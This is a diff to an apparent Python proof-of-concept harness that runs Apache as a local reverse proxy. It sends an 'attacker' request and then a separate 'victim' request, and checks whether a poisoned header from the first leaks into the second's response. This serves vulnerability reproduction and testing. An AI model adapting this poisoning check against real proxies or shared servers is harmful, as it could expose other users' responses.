@@ -89,10 +89,15 @@ ProxyPassReverse / http://127.0.0.1:{backend.port}/
             else:
                 raise TimeoutError("Apache did not listen on 127.0.0.1:18080")
             with client:
-                client.sendall(b"GET /a HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n")
+                client.sendall(b"GET /a?attacker_input=POISON HTTP/1.1\r\nHost: attacker\r\nConnection: keep-alive\r\n\r\n")
                 response_a = read_response(client)
-                client.sendall(b"GET /b HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
-                response_b = read_response(client)
+
+            # B is a separate frontend client. Its request and legitimate
+            # backend response are fixed and independent of A's payload.
+            victim = socket.create_connection(("127.0.0.1", 18080), timeout=2)
+            with victim:
+                victim.sendall(b"GET /b HTTP/1.1\r\nHost: victim\r\nConnection: close\r\n\r\n")
+                response_b = read_response(victim)
             thread.join(timeout=2)
             if b"Content-Length: 2" not in response_a or not response_a.endswith(b"OK"):
                 raise AssertionError(f"unexpected A response: {response_a!r}")
@@ -102,7 +107,7 @@ ProxyPassReverse / http://127.0.0.1:{backend.port}/
             poisoned = b"X-Poison: from-A" in response_b
             print(f"case={args.case} backend_connections={len(backend.connections)}")
             if args.case == "positive":
-                print("attacker_model=A_only_b_response=independent_fixed")
+                print("attacker_model=attacker_client_A_only_victim_client_B_b_response=independent_fixed")
             print("candidate_b_mechanics=observed" if poisoned else "candidate_b_mechanics=not_observed")
             if args.case == "positive" and not poisoned:
                 raise AssertionError("positive case did not cross response boundary")
